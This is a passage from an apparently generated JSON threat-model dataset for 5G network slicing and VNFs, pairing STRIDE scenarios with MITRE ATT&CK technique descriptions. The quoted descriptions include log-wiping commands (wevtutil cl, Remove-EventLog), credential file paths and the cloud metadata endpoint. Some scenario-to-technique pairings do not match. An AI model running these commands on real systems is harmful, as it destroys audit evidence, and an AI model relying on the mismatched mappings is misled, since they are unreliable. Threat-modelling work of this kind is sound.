                    "Assumption": "Lack of robust audit trails.",
                    "Role": "Compliance officer",
                    "Condition": "Audit trails are insufficient or non-existent."
                },
                {
                    "Assumption": "Insider has administrative privileges.",
                    "Role": "Insider",
                    "Condition": "Privileged access is not sufficiently restricted or monitored."
                }
            ],
            "Potential Impact": "Difficulty in conducting forensic investigations, potential for repeated malicious activities without detection.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "insider threat",
                "logging",
                "audit trail"
            ],
            "mitre_technique": {
                "name": "Clear Windows Event Logs",
                "description": "Adversaries may clear Windows Event Logs to hide the activity of an intrusion. Windows Event Logs are a record of a computer's alerts and notifications. There are three system-defined sources of events: System, Application, and Security, with five event types: Error, Warning, Information, Success Audit, and Failure Audit.\n\n\nWith administrator privileges, the event logs can be cleared with the following utility commands:\n\n* <code>wevtutil cl system</code>\n* <code>wevtutil cl application</code>\n* <code>wevtutil cl security</code>\n\nThese logs may also be cleared through other mechanisms, such as the event viewer GUI or [PowerShell](https://attack.mitre.org/techniques/T1059/001). For example, adversaries may use the PowerShell command <code>Remove-EventLog -LogName Security</code> to delete the Security EventLog and after reboot, disable future logging.  Note: events may still be generated and logged in the .evtx file between the time the command is run and the reboot.(Citation: disable_win_evt_logging)\n\nAdversaries may also attempt to clear logs by directly deleting the stored log files within `C:\\Windows\\System32\\winevt\\logs\\`.",
                "id": "attack-pattern--6495ae23-3ab4-43c5-a94f-5638a2c31fd2",
                "technique_id": "T1070.001"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "An attacker manipulates log files to cover up traces of data exfiltration activities.",
            "Assumptions": [
                {
                    "Assumption": "Logs do not have integrity checks.",
                    "Role": "Security engineer",
                    "Condition": "Integrity verification for logs is missing."
                },
                {
                    "Assumption": "Attacker has sufficient access rights to alter logs.",
                    "Role": "Attacker",
                    "Condition": "Privileges allow log alteration."
                },
                {
                    "Assumption": "Log storage is not adequately secured.",
                    "Role": "System administrator",
                    "Condition": "Log storage lacks protection mechanisms."
                }
            ],
            "Potential Impact": "Undetected data breaches, compromised data confidentiality, loss of audit trail usefulness.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "log manipulation",
                "data exfiltration",
                "audit trail"
            ],
            "mitre_technique": {
                "name": "Traffic Duplication",
                "description": "Adversaries may leverage traffic mirroring in order to automate data exfiltration over compromised infrastructure. Traffic mirroring is a native feature for some devices, often used for network analysis. For example, devices may be configured to forward network traffic to one or more destinations for analysis by a network analyzer or other monitoring device. (Citation: Cisco Traffic Mirroring)(Citation: Juniper Traffic Mirroring)\n\nAdversaries may abuse traffic mirroring to mirror or redirect network traffic through other infrastructure they control. Malicious modifications to network devices to enable traffic redirection may be possible through [ROMMONkit](https://attack.mitre.org/techniques/T1542/004) or [Patch System Image](https://attack.mitre.org/techniques/T1601/001).(Citation: US-CERT-TA18-106A)(Citation: Cisco Blog Legacy Device Attacks)\n\nMany cloud-based environments also support traffic mirroring. For example, AWS Traffic Mirroring, GCP Packet Mirroring, and Azure vTap allow users to define specified instances to collect traffic from and specified targets to send collected traffic to.(Citation: AWS Traffic Mirroring)(Citation: GCP Packet Mirroring)(Citation: Azure Virtual Network TAP)\n\nAdversaries may use traffic duplication in conjunction with [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Input Capture](https://attack.mitre.org/techniques/T1056), or [Adversary-in-the-Middle](https://attack.mitre.org/techniques/T1557) depending on the goals and objectives of the adversary.",
                "id": "attack-pattern--7c46b364-8496-4234-8a56-f7e6727e21e1",
                "technique_id": "T1020.001"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "A user denies initiating a Denial of Service attack due to lack of proper log records.",
            "Assumptions": [
                {
                    "Assumption": "Logging of user activities is inadequate.",
                    "Role": "Systems administrator",
                    "Condition": "Logging practices are not comprehensive."
                },
                {
                    "Assumption": "Logs do not correlate activities to specific users.",
                    "Role": "Security engineer",
                    "Condition": "User actions are not correlated in logs."
                },
                {
                    "Assumption": "Logging mechanisms do not capture sufficient detail during an attack.",
                    "Role": "Security analyst",
                    "Condition": "Detailed logging is not enabled or implemented."
                }
            ],
            "Potential Impact": "Inability to attribute actions, challenges in mitigating future attacks, compromised availability.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "denial of service",
                "logging",
                "user activity"
            ],
            "mitre_technique": {
                "name": "Web Portal Capture",
                "description": "Adversaries may install code on externally facing portals, such as a VPN login page, to capture and transmit credentials of users who attempt to log into the service. For example, a compromised login page may log provided user credentials before logging the user in to the service.\n\nThis variation on input capture may be conducted post-compromise using legitimate administrative access as a backup measure to maintain network access through [External Remote Services](https://attack.mitre.org/techniques/T1133) and [Valid Accounts](https://attack.mitre.org/techniques/T1078) or as part of the initial compromise by exploitation of the externally facing web service.(Citation: Volexity Virtual Private Keylogging)",
                "id": "attack-pattern--69e5226d-05dc-4f15-95d7-44f5ed78d06e",
                "technique_id": "T1056.003"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "An attacker exploits a vulnerability in the external interfaces to exfiltrate sensitive data from network slices.",
            "Assumptions": [
                {
                    "Assumption": "External interfaces have undisclosed vulnerabilities.",
                    "Role": "Development team",
                    "Condition": "Vulnerabilities are not patched."
                },
                {
                    "Assumption": "Sensitive data is transmitted through these interfaces.",
                    "Role": "Network administrator",
                    "Condition": "Data flows are not segregated or encrypted."
                },
                {
                    "Assumption": "Attackers have the capability to identify and exploit these vulnerabilities.",
                    "Role": "Attacker",
                    "Condition": "Advanced technical proficiency of the attacker."
                }
            ],
            "Potential Impact": "Unauthorized disclosure of sensitive information, breach of data confidentiality.",
            "MITRE ATT&CK Keywords": [
                "information disclosure",
                "vulnerability exploitation",
                "external interface",
                "data exfiltration"
            ],
            "mitre_technique": {
                "name": "Traffic Duplication",
                "description": "Adversaries may leverage traffic mirroring in order to automate data exfiltration over compromised infrastructure. Traffic mirroring is a native feature for some devices, often used for network analysis. For example, devices may be configured to forward network traffic to one or more destinations for analysis by a network analyzer or other monitoring device. (Citation: Cisco Traffic Mirroring)(Citation: Juniper Traffic Mirroring)\n\nAdversaries may abuse traffic mirroring to mirror or redirect network traffic through other infrastructure they control. Malicious modifications to network devices to enable traffic redirection may be possible through [ROMMONkit](https://attack.mitre.org/techniques/T1542/004) or [Patch System Image](https://attack.mitre.org/techniques/T1601/001).(Citation: US-CERT-TA18-106A)(Citation: Cisco Blog Legacy Device Attacks)\n\nMany cloud-based environments also support traffic mirroring. For example, AWS Traffic Mirroring, GCP Packet Mirroring, and Azure vTap allow users to define specified instances to collect traffic from and specified targets to send collected traffic to.(Citation: AWS Traffic Mirroring)(Citation: GCP Packet Mirroring)(Citation: Azure Virtual Network TAP)\n\nAdversaries may use traffic duplication in conjunction with [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Input Capture](https://attack.mitre.org/techniques/T1056), or [Adversary-in-the-Middle](https://attack.mitre.org/techniques/T1557) depending on the goals and objectives of the adversary.",
                "id": "attack-pattern--7c46b364-8496-4234-8a56-f7e6727e21e1",
                "technique_id": "T1020.001"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "A malicious actor intercepts unencrypted communications between network functions to capture sensitive data.",
            "Assumptions": [
                {
                    "Assumption": "Communications between network functions are unencrypted.",
                    "Role": "Network engineer",
                    "Condition": "Encryption mechanisms are not implemented."
                },
                {
                    "Assumption": "Network traffic can be intercepted in transit.",
                    "Role": "Attacker",
                    "Condition": "Network lacks adequate security controls."
                },
                {
                    "Assumption": "Sensitive data is included in the intercepted communications.",
                    "Role": "Data owner",
                    "Condition": "Sensitive data is not protected."
                }
            ],
            "Potential Impact": "Unauthorized access to sensitive information, potential compromise of data confidentiality.",
            "MITRE ATT&CK Keywords": [
                "information disclosure",
                "interception",
                "unencrypted communication",
                "network function"
            ],
            "mitre_technique": {
                "name": "Content Injection",
                "description": "Adversaries may gain access and continuously communicate with victims by injecting malicious content into systems through online network traffic. Rather than luring victims to malicious payloads hosted on a compromised website (i.e., [Drive-by Target](https://attack.mitre.org/techniques/T1608/004) followed by [Drive-by Compromise](https://attack.mitre.org/techniques/T1189)), adversaries may initially access victims through compromised data-transfer channels where they can manipulate traffic and/or inject their own content. These compromised online network channels may also be used to deliver additional payloads (i.e., [Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105)) and other data to already compromised systems.(Citation: ESET MoustachedBouncer)\n\nAdversaries may inject content to victim systems in various ways, including:\n\n* From the middle, where the adversary is in-between legitimate online client-server communications (**Note:** this is similar but distinct from [Adversary-in-the-Middle](https://attack.mitre.org/techniques/T1557), which describes AiTM activity solely within an enterprise environment) (Citation: Kaspersky Encyclopedia MiTM)\n* From the side, where malicious content is injected and races to the client as a fake response to requests of a legitimate online server (Citation: Kaspersky ManOnTheSide)\n\nContent injection is often the result of compromised upstream communication channels, for example at the level of an internet service provider (ISP) as is the case with \"lawful interception.\"(Citation: Kaspersky ManOnTheSide)(Citation: ESET MoustachedBouncer)(Citation: EFF China GitHub Attack)",
                "id": "attack-pattern--43c9bc06-715b-42db-972f-52d25c09a20c",
                "technique_id": "T1659"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "A compromised VNF exposes sensitive data it processes to unauthorized parties.",
            "Assumptions": [
                {
                    "Assumption": "VNFs handle sensitive data without adequate security measures.",
                    "Role": "VNF developer",
                    "Condition": "VNF security policies are inadequate."
                },
                {
                    "Assumption": "VNF instances can be compromised without detection.",
                    "Role": "Security team",
                    "Condition": "Intrusion detection is not enforced."
                },
                {
                    "Assumption": "Compromised VNF can send data to external, unauthorized endpoints.",
                    "Role": "Attacker",
                    "Condition": "Egress data controls are not in place."
                }
            ],
            "Potential Impact": "Sensitive data leakage, breach of confidentiality, potential regulatory violations.",
            "MITRE ATT&CK Keywords": [
                "information disclosure",
                "VNF",
                "compromised",
                "sensitive data"
            ],
            "mitre_technique": {
                "name": "Cloud Instance Metadata API",
                "description": "Adversaries may attempt to access the Cloud Instance Metadata API to collect credentials and other sensitive data.\n\nMost cloud service providers support a Cloud Instance Metadata API which is a service provided to running virtual instances that allows applications to access information about the running virtual instance. Available information generally includes name, security group, and additional metadata including sensitive data such as credentials and UserData scripts that may contain additional secrets. The Instance Metadata API is provided as a convenience to assist in managing applications and is accessible by anyone who can access the instance.(Citation: AWS Instance Metadata API) A cloud metadata API has been used in at least one high profile compromise.(Citation: Krebs Capital One August 2019)\n\nIf adversaries have a presence on the running virtual instance, they may query the Instance Metadata API directly to identify credentials that grant access to additional resources. Additionally, adversaries may exploit a Server-Side Request Forgery (SSRF) vulnerability in a public facing web proxy that allows them to gain access to the sensitive information via a request to the Instance Metadata API.(Citation: RedLock Instance Metadata API 2018)\n\nThe de facto standard across cloud service providers is to host the Instance Metadata API at <code>http[:]//169.254.169.254</code>.\n",
                "id": "attack-pattern--19bf235b-8620-4997-b5b4-94e0659ed7c3",
                "technique_id": "T1552.005"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An attacker overwhelms network functions with excessive fake traffic, causing service disruption.",
            "Assumptions": [
                {
                    "Assumption": "Network functions can be overwhelmed by excessive network traffic.",
                    "Role": "Network administrator",
                    "Condition": "No rate-limiting mechanisms in place."
                },
                {
                    "Assumption": "Network lacks adequate DoS protection mechanisms.",
                    "Role": "Security architect",
                    "Condition": "DoS protection is not implemented."
                },
                {
                    "Assumption": "Attacker's capability to generate massive traffic.",
                    "Role": "Attacker",
                    "Condition": "Access to resources to generate large volumes of traffic."
                }
            ],
            "Potential Impact": "Service unavailability, degradation of performance, potential loss of user trust.",
            "MITRE ATT&CK Keywords": [
                "denial of service",
                "fake traffic",
                "network functions",
                "service disruption"
            ],
            "mitre_technique": {
                "name": "Direct Network Flood",
                "description": "Adversaries may attempt to cause a denial of service (DoS) by directly sending a high-volume of network traffic to a target. This DoS attack may also reduce the availability and functionality of the targeted system(s) and network. [Direct Network Flood](https://attack.mitre.org/techniques/T1498/001)s are when one or more systems are used to send a high-volume of network packets towards the targeted service's network. Almost any network protocol may be used for flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well.\n\nBotnets are commonly used to conduct network flooding attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global Internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for distributed DoS (DDoS), so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS flooding attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)",
                "id": "attack-pattern--0bda01d5-4c1d-4062-8ee2-6872334383c3",
                "technique_id": "T1498.001"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "A coordinated attack against the VNFs' host environment to exhaust available resources.",
            "Assumptions": [
                {
                    "Assumption": "Host environment's resource allocation can be overwhelmed.",
                    "Role": "System administrator",
                    "Condition": "Lack of resource allocation limits."
                },
                {
                    "Assumption": "No automated scaling to mitigate resource exhaustion.",
                    "Role": "Cloud architect",
                    "Condition": "Scaling mechanisms are not implemented."
                },
                {
                    "Assumption": "Attackers have synchronized attack capabilities.",
                    "Role": "Attacker",
                    "Condition": "Coordination and resources for synchronized attacks."
                }
            ],
            "Potential Impact": "Service interruption, degraded performance of all hosted VNFs, extensive recovery required.",
            "MITRE ATT&CK Keywords": [
                "denial of service",
                "resource exhaustion",
                "host environment",
                "VNF"
            ],
            "mitre_technique": {
                "name": "OS Exhaustion Flood",
                "description": "Adversaries may launch a denial of service (DoS) attack targeting an endpoint's operating system (OS). A system's OS is responsible for managing the finite resources as well as preventing the entire system from being overwhelmed by excessive demands on its capacity. These attacks do not need to exhaust the actual resources on a system; the attacks may simply exhaust the limits and available resources that an OS self-imposes.\n\nDifferent ways to achieve this exist, including TCP state-exhaustion attacks such as SYN floods and ACK floods.(Citation: Arbor AnnualDoSreport Jan 2018) With SYN floods, excessive amounts of SYN packets are sent, but the 3-way TCP handshake is never completed. Because each OS has a maximum number of concurrent TCP connections that it will allow, this can quickly exhaust the ability of the system to receive new requests for TCP connections, thus preventing access to any TCP service provided by the server.(Citation: Cloudflare SynFlood)\n\nACK floods leverage the stateful nature of the TCP protocol. A flood of ACK packets are sent to the target. This forces the OS to search its state table for a related TCP connection that has already been established. Because the ACK packets are for connections that do not exist, the OS will have to search the entire state table to confirm that no match exists. When it is necessary to do this for a large flood of packets, the computational requirements can cause the server to become sluggish and/or unresponsive, due to the work it must do to eliminate the rogue ACK packets. This greatly reduces the resources available for providing the targeted service.(Citation: Corero SYN-ACKflood)",
                "id": "attack-pattern--0df05477-c572-4ed6-88a9-47c581f548f7",
                "technique_id": "T1499.001"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An attacker exploits a vulnerability in network orchestration software, causing widespread service disruption.",
            "Assumptions": [
                {
                    "Assumption": "Orchestration software has unpatched vulnerabilities.",
                    "Role": "Software vendor",
                    "Condition": "Unpatched or unknown software vulnerabilities."
                },
                {
                    "Assumption": "Orchestration controls critical networking functions.",
                    "Role": "Network manager",
                    "Condition": "Orchestration software is critical to operations."
                },
                {
                    "Assumption": "Attacker can exploit these vulnerabilities.",
                    "Role": "Attacker",
                    "Condition": "Technical capability and knowledge of vulnerabilities."
                }
            ],
            "Potential Impact": "Widespread service disruption, loss of network control, potential long-term outages.",
            "MITRE ATT&CK Keywords": [
                "denial of service",
                "vulnerability exploitation",
                "orchestration software",
                "service disruption"
            ],
            "mitre_technique": {
                "name": "Application or System Exploitation",
                "description": "Adversaries may exploit software vulnerabilities that can cause an application or system to crash and deny availability to users. (Citation: Sucuri BIND9 August 2015) Some systems may automatically restart critical applications and services when crashes occur, but they can likely be re-exploited to cause a persistent denial of service (DoS) condition.\n\nAdversaries may exploit known or zero-day vulnerabilities to crash applications and/or systems, which may also lead to dependent applications and/or systems to be in a DoS condition. Crashed or restarted applications or systems may also have other effects such as [Data Destruction](https://attack.mitre.org/techniques/T1485), [Firmware Corruption](https://attack.mitre.org/techniques/T1495), [Service Stop](https://attack.mitre.org/techniques/T1489) etc. which may further cause a DoS condition and deny availability to critical information, applications and/or systems. ",
                "id": "attack-pattern--2bee5ffb-7a7a-4119-b1f2-158151b19ac0",
                "technique_id": "T1499.004"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker exploits a vulnerability in VNF software to gain administrative access.",
            "Assumptions": [
                {
                    "Assumption": "VNF software contains exploitable vulnerabilities.",
                    "Role": "Software developer",
                    "Condition": "Software maintenance and patching are inadequate."
                },
                {
                    "Assumption": "Administrative controls are insufficiently enforced.",
                    "Role": "System administrator",
                    "Condition": "Lack of strong access control policies."
                },
                {
                    "Assumption": "Attacker has knowledge of and access to exploit the vulnerabilities.",
                    "Role": "Attacker",
                    "Condition": "Technical proficiency and access to information."
                }
            ],
            "Potential Impact": "Unauthorized control over VNFs, potential data breaches, complete network slice compromise.",
            "MITRE ATT&CK Keywords": [
                "elevation of privilege",
                "VNF",
                "software vulnerability",
                "administrative access"
            ],
            "mitre_technique": {
                "name": "Exploitation for Privilege Escalation",
                "description": "Adversaries may exploit software vulnerabilities in an attempt to elevate privileges. Exploitation of a software vulnerability occurs when an adversary takes advantage of a programming error in a program, service, or within the operating system software or kernel itself to execute adversary-controlled code. Security constructs such as permission levels will often hinder access to information and use of certain techniques, so adversaries will likely need to perform privilege escalation to include use of software exploitation to circumvent those restrictions.\n\nWhen initially gaining access to a system, an adversary may be operating within a lower privileged process which will prevent them from accessing certain resources on the system. Vulnerabilities may exist, usually in operating system components and software commonly running at higher permissions, that can be exploited to gain higher levels of access on the system. This could enable someone to move from unprivileged or user level permissions to SYSTEM or root permissions depending on the component that is vulnerable. This could also enable an adversary to move from a virtualized environment, such as within a virtual machine or container, onto the underlying host. This may be a necessary step for an adversary compromising an endpoint system that has been properly configured and limits other privilege escalation methods.\n\nAdversaries may bring a signed vulnerable driver onto a compromised machine so that they can exploit the vulnerability to execute code in kernel mode. This process is sometimes referred to as Bring Your Own Vulnerable Driver (BYOVD).(Citation: ESET InvisiMole June 2020)(Citation: Unit42 AcidBox June 2020) Adversaries may include the vulnerable driver with files delivered during Initial Access or download it to a compromised system via [Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105) or [Lateral Tool Transfer](https://attack.mitre.org/techniques/T1570).",
                "id": "attack-pattern--b21c3b2d-02e6-45b1-980b-e69051040839",
                "technique_id": "T1068"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "A malicious actor elevates privileges by capturing and using administrator session tokens.",
            "Assumptions": [
                {
                    "Assumption": "Session tokens are not securely managed.",
                    "Role": "Security officer",
                    "Condition": "Weak token management policies."
                },
                {
                    "Assumption": "Network traffic containing tokens is unencrypted.",
                    "Role": "Network engineer",
                    "Condition": "Lack of encrypted communication channels."
                },
                {
                    "Assumption": "Attacker can intercept these tokens in transit.",
                    "Role": "Attacker",
                    "Condition": "Attacker's capability to access network traffic."
                }
            ],
            "Potential Impact": "Unauthorized access to administrative functions, potential data manipulation, network disruptions.",
            "MITRE ATT&CK Keywords": [
                "elevation of privilege",
                "session token",
                "administrative functions",
                "network"
            ],
            "mitre_technique": {
                "name": "Steal Web Session Cookie",
                "description": "An adversary may steal web application or service session cookies and use them to gain access to web applications or Internet services as an authenticated user without needing credentials. Web applications and services often use session cookies as an authentication token after a user has authenticated to a website.\n\nCookies are often valid for an extended period of time, even if the web application is not actively used. Cookies can be found on disk, in the process memory of the browser, and in network traffic to remote systems. Additionally, other applications on the targets machine might store sensitive authentication cookies in memory (e.g. apps which authenticate to cloud services). Session cookies can be used to bypasses some multi-factor authentication protocols.(Citation: Pass The Cookie)\n\nThere are several examples of malware targeting cookies from web browsers on the local system.(Citation: Kaspersky TajMahal April 2019)(Citation: Unit 42 Mac Crypto Cookies January 2019) Adversaries may also steal cookies by injecting malicious JavaScript content into websites or relying on [User Execution](https://attack.mitre.org/techniques/T1204) by tricking victims into running malicious JavaScript in their browser.(Citation: Talos Roblox Scam 2023)(Citation: Krebs Discord Bookmarks 2023)\n\nThere are also open source frameworks such as `Evilginx2` and `Muraena` that can gather session cookies through a malicious proxy (e.g., [Adversary-in-the-Middle](https://attack.mitre.org/techniques/T1557)) that can be set up by an adversary and used in phishing campaigns.(Citation: Github evilginx2)(Citation: GitHub Mauraena)\n\nAfter an adversary acquires a valid cookie, they can then perform a [Web Session Cookie](https://attack.mitre.org/techniques/T1550/004) technique to login to the corresponding web application.",
                "id": "attack-pattern--10ffac09-e42d-4f56-ab20-db94c67d76ff",
                "technique_id": "T1539"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker exploits a misconfiguration in access control settings to gain unauthorized higher-level access.",
            "Assumptions": [
                {
                    "Assumption": "Access control settings are improperly configured.",
                    "Role": "System administrator",
                    "Condition": "Lack of proper configuration management."
                },
                {
                    "Assumption": "Misconfigurations are not audited regularly.",
                    "Role": "Auditor",
                    "Condition": "Lack of periodic audits of access control settings."
                },
                {
                    "Assumption": "Attacker has the capability to discover and exploit these misconfigurations.",
                    "Role": "Attacker",
                    "Condition": "Technical skill and knowledge of the misconfigurations."
                }
            ],
            "Potential Impact": "Unauthorized access to sensitive functions, potential system control, data breaches.",
            "MITRE ATT&CK Keywords": [
                "elevation of privilege",
                "access control",
                "misconfiguration",
                "unauthorized access"
            ],
            "mitre_technique": {
                "name": "Steal or Forge Kerberos Tickets",
                "description": "Adversaries may attempt to subvert Kerberos authentication by stealing or forging Kerberos tickets to enable [Pass the Ticket](https://attack.mitre.org/techniques/T1550/003). Kerberos is an authentication protocol widely used in modern Windows domain environments. In Kerberos environments, referred to as \u201crealms\u201d, there are three basic participants: client, service, and Key Distribution Center (KDC).(Citation: ADSecurity Kerberos Ring Decoder) Clients request access to a service and through the exchange of Kerberos tickets, originating from KDC, they are granted access after having successfully authenticated. The KDC is responsible for both authentication and ticket granting.  Adversaries may attempt to abuse Kerberos by stealing tickets or forging tickets to enable unauthorized access.\n\nOn Windows, the built-in <code>klist</code> utility can be used to list and analyze cached Kerberos tickets.(Citation: Microsoft Klist)\n\nLinux systems on Active Directory domains store Kerberos credentials locally in the credential cache file referred to as the \"ccache\". The credentials are stored in the ccache file while they remain valid and generally while a user's session lasts.(Citation: MIT ccache) On modern Redhat Enterprise Linux systems, and derivative distributions, the System Security Services Daemon (SSSD) handles Kerberos tickets. By default SSSD maintains a copy of the ticket database that can be found in <code>/var/lib/sss/secrets/secrets.ldb</code> as well as the corresponding key located in <code>/var/lib/sss/secrets/.secrets.mkey</code>. Both files require root access to read. If an adversary is able to access the database and key, the credential cache Kerberos blob can be extracted and converted into a usable Kerberos ccache file that adversaries may use for [Pass the Ticket](https://attack.mitre.org/techniques/T1550/003). The ccache file may also be converted into a Windows format using tools such as Kekeo.(Citation: Linux Kerberos Tickets)(Citation: Brining MimiKatz to Unix)(Citation: Kekeo)\n\n\nKerberos tickets on macOS are stored in a standard ccache format, similar to Linux. By default, access to these ccache entries is federated through the KCM daemon process via the Mach RPC protocol, which uses the caller's environment to determine access. The storage location for these ccache entries is influenced by the <code>/etc/krb5.conf</code> configuration file and the <code>KRB5CCNAME</code> environment variable which can specify to save them to disk or keep them protected via the KCM daemon. Users can interact with ticket storage using <code>kinit</code>, <code>klist</code>, <code>ktutil</code>, and <code>kcc</code> built-in binaries or via Apple's native Kerberos framework. Adversaries can use open source tools to interact with the ccache files directly or to use the Kerberos framework to call lower-level APIs for extracting the user's TGT or Service Tickets.(Citation: SpectorOps Bifrost Kerberos macOS 2019)(Citation: macOS kerberos framework MIT)\n",
                "id": "attack-pattern--3fc01293-ef5e-41c6-86ce-61f10706b64a",
                "technique_id": "T1558"
            }
        }
    ]
},
{
    "case_number": "3",
    "batch_number": "9",
    "threats": [
        {
            "Threat Type": "Spoofing",
            "Scenario": "Unauthorized access to network slices by impersonating legitimate devices.",
            "Assumptions": [
                {
                    "Assumption": "Devices use weak or vulnerable authentication protocols",
                    "Role": "Network Administrator",
                    "Condition": "Authentication protocols are not updated regularly."
                },
                {
                    "Assumption": "Attackers have access to the network entry points",
                    "Role": "External Adversary",
                    "Condition": "Firewall rules are misconfigured or insufficient."
                },
                {
                    "Assumption": "There is insufficient monitoring of access logs",
                    "Role": "Security Operations Center (SOC)",
                    "Condition": "Logs are not regularly reviewed or anomalies are not flagged."
                }
            ],
            "Potential Impact": "Unauthorized disclosure of sensitive information, potential tampering with network configurations, and disruption of network services.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "network",
                "device",
                "impersonation"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "Impersonation of orchestration and management components to manipulate network slices.",
            "Assumptions": [
                {
                    "Assumption": "Weak identity proofing of orchestration components",
                    "Role": "Orchestration Administrator",
                    "Condition": "Identity management systems are poorly configured."
                },
                {
                    "Assumption": "Lack of multi-factor authentication for critical admin interfaces",
                    "Role": "Network Administrator",
                    "Condition": "Admin interfaces rely solely on passwords."
                },
                {
                    "Assumption": "Poor network segmentation between orchestration components and other entities",
                    "Role": "Network Engineer",
                    "Condition": "Network segmentation is not enforced or properly configured."
                }
            ],
            "Potential Impact": "Manipulation of network slice configurations, potentially leading to service outages or performance degradation.",
            "MITRE ATT&CK Keywords": [
                "identity theft",
                "management interface",
                "orchestration"
            ],
            "mitre_technique": {
                "name": "Additional Container Cluster Roles",
                "description": "An adversary may add additional roles or permissions to an adversary-controlled user or service account to maintain persistent access to a container orchestration system. For example, an adversary with sufficient permissions may create a RoleBinding or a ClusterRoleBinding to bind a Role or ClusterRole to a Kubernetes account.(Citation: Kubernetes RBAC)(Citation: Aquasec Kubernetes Attack 2023) Where attribute-based access control (ABAC) is in use, an adversary with sufficient permissions may modify a Kubernetes ABAC policy to give the target account additional permissions.(Citation: Kuberentes ABAC)\n \nThis account modification may immediately follow [Create Account](https://attack.mitre.org/techniques/T1136) or other malicious account activity. Adversaries may also modify existing [Valid Accounts](https://attack.mitre.org/techniques/T1078) that they have compromised.  \n\nNote that where container orchestration systems are deployed in cloud environments, as with Google Kubernetes Engine, Amazon Elastic Kubernetes Service, and Azure Kubernetes Service, cloud-based  role-based access control (RBAC) assignments or ABAC policies can often be used in place of or in addition to local permission assignments.(Citation: Google Cloud Kubernetes IAM)(Citation: AWS EKS IAM Roles for Service Accounts)(Citation: Microsoft Azure Kubernetes Service Service Accounts) In these cases, this technique may be used in conjunction with [Additional Cloud Roles](https://attack.mitre.org/techniques/T1098/003).",
                "id": "attack-pattern--35d30338-5bfa-41b0-a170-ec06dfd75f64",
                "technique_id": "T1098.006"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "Malicious actor impersonates legitimate user to gain access to VNFs.",
            "Assumptions": [
                {
                    "Assumption": "User credentials are compromised",
                    "Role": "End User",
                    "Condition": "Users fall victim to phishing attacks."
                },
                {
                    "Assumption": "Insufficient logging and monitoring of user activities",
                    "Role": "SOC Analyst",
                    "Condition": "User activities are not adequately logged or monitored."
                },
                {
                    "Assumption": "Users have excessive privileges without proper need-to-know",
                    "Role": "Access Control Manager",
                    "Condition": "Roles and permissions are not regularly reviewed."
                }
            ],
            "Potential Impact": "Unauthorized access to sensitive data within VNFs and potential disruption of VNF operation.",
            "MITRE ATT&CK Keywords": [
                "phishing",
                "user account",
                "access control"
            ],
            "mitre_technique": {
                "name": "Steal Web Session Cookie",
